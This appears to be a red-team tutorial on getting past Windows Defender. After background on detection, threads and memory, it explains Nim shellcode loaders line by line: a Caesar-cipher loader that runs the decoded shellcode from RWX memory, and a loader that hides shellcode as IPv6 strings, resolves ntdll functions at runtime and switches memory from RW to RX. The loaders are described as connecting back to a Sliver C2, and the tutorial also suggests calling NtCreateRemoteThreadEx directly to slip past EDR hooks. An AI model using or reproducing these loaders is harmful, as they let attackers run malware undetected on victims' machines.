## Things To Know Before We Start

--- 


### What is Windows defender?

**Windows defender** is a built-in antivirus and antimalware solution provided by Microsoft for Windows operating systems. It helps protect your computer against various threats such as viruses, spyware, ransomware, and other malicious software.

Key Features of Windows Defender

**Anomaly Detection**: Windows Defender continuously monitors for suspicious behavior on a machine. This allows it to block new or previously unknown malware that has no signature in its database. It detects deviations from normal activity and flags them as potentially malicious.

**Cloud-Delivered Protection**: When a new or unknown file is encountered, its metadata is sent to Microsoft's cloud for rapid analysis. In a process known as "Block at First Sight," the cloud can quickly analyze the file using sandboxing, heuristics, and machine learning to determine if it is malicious. This process can reduce the response time for new threats from hours to seconds, providing near-instant protection.

**Behavioral Blocking**: This feature is a direct countermeasure to fileless malware. It monitors for suspicious behaviors and can stop a threat at the very beginning of its execution, preventing it from performing malicious actions, such as code injection or modifying the registry.

### How Windows defender Work?

 **Static Analysis**: Static analysis means examining a program without running it.
The antivirus scans the file and looks for:

- known malicious strings
- suspicious code patterns
- dangerous imports
- shellcode signatures
- encoded commands

It works by comparing parts of the file against known malware indicators.

A common tool used for this is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) by rasta-mous. 

**ThreatCheck** helps identify which specific strings or parts inside an executable are triggering Windows Defender detection.

This is useful for:

- malware analysis
- red team research
- understanding AV signatures
- testing how Defender detects files
The tool works by repeatedly scanning parts of the executable until it finds the exact bytes or strings that Defender flags.

### Heuristic and Behavioral Detection

**Heuristic detection**: tries to understand what a program is designed to do, even if the file has never been seen before.
Instead of only looking for known signatures, the antivirus analyzes:

- file changes
- memory activity
- registry modifications
- process creation
- network connections
- API calls
It then checks for behavior commonly associated with malware.

**Behavioral detection**: It focuses on watching the actions a program performs while running on the system. If the program starts doing suspicious things, the antivirus may block or quarantine it even if the file was not detected earlier.
Examples of suspicious behavior include:

- injecting into another process
- modifying security settings
- downloading additional payloads
- creating persistence
- encrypting many files rapidly
- spawning PowerShell or cmd unexpectedly


Some sequences of Windows API calls are also known to be common malware patterns.

For example:

```bash
VirtualAllocEx
WriteProcessMemory
CreateRemoteThread
```
When these APIs are called in sequence, it often indicates process injection behavior, which is commonly used by malware and offensive tooling.

Because of this, antivirus products may flag or monitor programs performing these actions.

### What is Shellcode?

**Shellcode** is a small piece of machine code designed to make a system perform a specific action after exploitation.
Originally, shellcode was used to spawn a shell (like cmd.exe or /bin/sh), which is why it is called shellcode.

shellcode can do many things, such as:

- open a reverse shell
- download malware
- inject into another process
- execute commands
- load a payload into memory

---

### What is Thread 

Think of a process as a factory and threads as the workers inside that factory. The factory (process) provides the building, tools and resources, but the actual work is done by the workers (threads). Every factory must have at least one worker to do anything useful, but most factories hire multiple workers to get things done faster at the same time.
A thread contains two important things. First is the CPU state which includes all the registers these are like the worker's current memory of what they are doing right now. Second is the call stack which is the list of tasks the worker needs to complete in order.

**Why Multiple Threads?**

When you open a browser, one thread loads the webpage, another thread plays a video, another handles your mouse clicks all happening at the same time. This is called parallel execution. Without multiple threads everything would happen one after another and feel very slow.

**CreateThread vs CreateRemoteThread:**

"CreateThread": creates a new worker inside your own factory. When your loader calls CreateThread it creates a new thread inside itself to run the shellcode.

"CreateRemoteThread": is more powerful and more dangerous. It creates a new worker inside someone else's factory meaning inside a completely different process. This is used in process injection where you inject shellcode into legitimate processes like explorer.exe or svchost.exe to hide your malicious activity.

**How They Connect Under the Hood:**
Both `CreateThread` and `CreateRemoteThread` are actually just simplified wrappers. Internally they both call `CreateRemoteThreadEx` which handles the actual work. `CreateRemoteThreadEx` then calls the Windows kernel function `NtCreateRemoteThreadEx` which is the lowest level function that actually creates the thread in the operating system. This is important for red teamers because some EDRs hook `CreateThread` and `CreateRemoteThread` but miss `NtCreateRemoteThreadEx` — so calling it directly can bypass detection.

### What is Virtual Memory?

Every process gets its own **private memory space** that no other process can see or touch. Think of it like each program has its own private notebook that only it can read and write in.

The **Windows Memory Manager** is the middleman that connects this virtual memory to the actual physical RAM in your computer. If RAM gets full, Windows moves some data to your hard disk temporarily — this is called **paging**.

**Three Main Memory Functions:**

1. **VirtualAlloc — Reserve Memory**
   This is how a program asks Windows for a chunk of memory to use. Like raising your hand and saying "I need some space to store data". Windows gives you a block of memory at a specific address.

2. **VirtualFree — Release Memory**
   When you're done with the memory, you give it back to Windows. Like cleaning up your workspace when you're finished. If you don't free memory, it causes memory leaks.

3. **VirtualProtect — Change Permissions**
   Every memory block has permissions that control what can be done with it. VirtualProtect lets you change those permissions. For example changing from Read+Write to Read+Execute after you've written your shellcode.

**Memory Permissions:**

- **Read** — the program can read the data stored there
- **Write** — the program can write or modify data there
- **Execute** — the CPU is allowed to run the code stored there

### Code Explanation

**Import:**
```nim
import winim/lean
```
Imports Windows API functions like `VirtualAlloc`, `CreateThread` etc. Without this nothing works.

**Main Procedure:**
```nim
proc main() =
```
Creates a function called main. Everything inside must be indented 2 spaces.

**Encrypted Shellcode:**
```nim
var caesar = [byte 0x09, 0x55, 0x90, 0xf1...]
```
This is the shellcode encrypted with Caesar cipher (each byte had 13 added to it). Stored as an array of bytes. AV sees these scrambled bytes and doesn't recognize them as shellcode.

**Empty Shellcode Buffer:**
```nim
var shellcode: array[510, byte]
```
Creates an empty 510-byte array where decrypted shellcode will be stored.

**Caesar Decryption Loop:**
```nim
for i in 0 ..< caesar.len:
  if (caesar[i].int - 13) < 0:
    shellcode[i] = byte(caesar[i].int + 256 - 13)
  else:
    shellcode[i] = byte(caesar[i].int - 13)
```
Goes through every byte and subtracts 13 to decrypt it back to original shellcode. The `if` check handles bytes where subtracting 13 would go below 0 — adds 256 to wrap around correctly.

**Allocate Memory:**
```nim
let mem = VirtualAlloc(NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
if mem == NULL:
  quit(1)
```
Asks Windows for a block of memory with RWX permissions. If Windows can't allocate — exit program. This memory is where shellcode will actually run from.

**Copy Shellcode:**
```nim
copyMem(mem, addr shellcode[0], shellcode.len)
```
Copies decrypted shellcode from the `shellcode` array into the newly allocated RWX memory. Now the code is in executable memory.

**Execute Shellcode:**
```nim
let hThread = CreateThread(NULL, 0, cast[LPTHREAD_START_ROUTINE](mem), NULL, 0, NULL)
if hThread == 0:
  quit(1)
```
Creates a new Windows thread that starts executing at the shellcode address. The `cast` tells Windows to treat the memory address as a function to call. If thread creation fails — exit.

**Wait:**
```nim
WaitForSingleObject(hThread, INFINITE)
```
Makes main program wait forever for the thread to finish. Without this the program would exit immediately and kill the shellcode thread before it connects back to Sliver.

**Call Main:**
```nim
main()
```
Starts the whole program by calling the main procedure.

## Technique 2 — RC4 via SystemFunction033

RC4 encryption, also known as ARC4, is a stream cipher. In RC4, a user supplies plaintext data and a key. The encryption algorithm generates a keystream from the key. The plaintext is then XORed with the keystream on a byte-by-byte basis to produce the encrypted data.

**Simple idea:**

- **Plaintext** = normal readable data
- **Key** = secret password

RC4 uses the key to create a **random-looking stream of bytes** called a **keystream**. The plaintext is combined with the keystream using **XOR**.

## Technique 3 — IPv6 Obfuscation


### What is IPv6?

IPv6 is a network address format. A normal IPv6 address looks like this:
```bash
fc48:83e4:f0e8:cc00:0000:4151:4150:5256
```
It is made up of hexadecimal numbers separated by colons. Each group of 4 hex digits represents 2 bytes. A full IPv6 address contains 16 bytes total.

Shellcode is just raw bytes. IPv6 addresses are also just bytes. Since both are made of the same thing — bytes — you can represent shellcode bytes as IPv6 addresses. Instead of storing your shellcode as obvious bytes like `\xfc\x48\x83\xe4`, you store it disguised as harmless-looking IP addresses.

### Code Explanation

**Import:**
```nim
import winim/lean
```
Imports Windows API functions like `VirtualAlloc`, `CreateThread` etc. Without this nothing works.

**IPv6 Encoded Shellcode:**
```nim
var IPv6s = [
  "fc48:83e4:f0e8:cc00:0:4151:4150:5251",
  ...
]
```
Stores the shellcode disguised as IPv6 address strings. Each string represents exactly 16 bytes of shellcode. AV scanning the binary sees only innocent looking network address strings instead of suspicious shellcode bytes.

**Array Size:**
```nim
let arrSize = IPv6s.len
```
Counts how many IPv6 addresses are in the array. Each address equals 16 bytes of shellcode.

**Total Shellcode Size:**
```nim
let shellcodeSize = arrSize * 16
```
Calculates total shellcode size. Multiplies number of IPv6 addresses by 16 because each address decodes to exactly 16 bytes.

**Define Function Type:**
```nim
type
  RtlIpv6StringToAddressAType = proc(
    AddressString: PCSTR,
    Terminator: ptr PCSTR,
    Address: pointer
  ): NTSTATUS {.stdcall.}
```
Defines the function signature for `RtlIpv6StringToAddressA`. NTSTATUS return code where 0 means success. stdcall is the required Windows calling convention.

**Load ntdll:**
```nim
let ntdll = LoadLibraryA("ntdll.dll")
```
Loads ntdll.dll at runtime instead of importing statically. This means the function name does not appear in the binary import table making static analysis harder.

**Get Function Address:**
```nim
let RtlIpv6StringToAddressA = cast[RtlIpv6StringToAddressAType](
  GetProcAddress(ntdll, "RtlIpv6StringToAddressA")
)
```
Gets the memory address of `RtlIpv6StringToAddressA` inside ntdll.dll. The cast converts the raw address into our typed function pointer.

**Allocate RW Memory:**
```nim
let buffer = VirtualAlloc(NULL, cast[SIZE_T](shellcodeSize), MEM_RESERVE or MEM_COMMIT, PAGE_READWRITE)
```
Allocates memory with only Read and Write permissions — NOT Execute. RWX memory is a major red flag for AV so we split it into RW first then RX later.

**Decode IPv6 Loop:**
```nim
var offset = 0
for i in 0 ..< arrSize:
  let dest = cast[pointer](cast[uint64](buffer) + uint64(offset))
  var terminator: PCSTR = nil
  let status = RtlIpv6StringToAddressA(
    cast[PCSTR](cstring(IPv6s[i])),
    addr terminator,
    dest
  )
  offset += 16
```
Goes through every IPv6 address and converts it back to raw bytes. offset tracks where in the buffer to write the next 16 bytes. After the loop the buffer contains the complete reconstructed shellcode.

**Change RW to RX:**
```nim
var oldProtect: DWORD = 0
VirtualProtect(buffer, cast[SIZE_T](shellcodeSize), PAGE_EXECUTE_READ, addr oldProtect)
```
Changes memory from Read+Write to Read+Execute only. Removes Write permission before execution. Much less suspicious than keeping RWX throughout.

**Execute:**
```nim
let hThread = CreateThread(NULL, 0, cast[LPTHREAD_START_ROUTINE](buffer), NULL, 0, NULL)
```
Creates a new thread that starts executing from the buffer where shellcode now lives.

**Wait:**
```nim
WaitForSingleObject(hThread, INFINITE)
```
Keeps the main program alive until shellcode thread finishes. Without this the process would exit immediately killing the shellcode before it connects to Sliver.
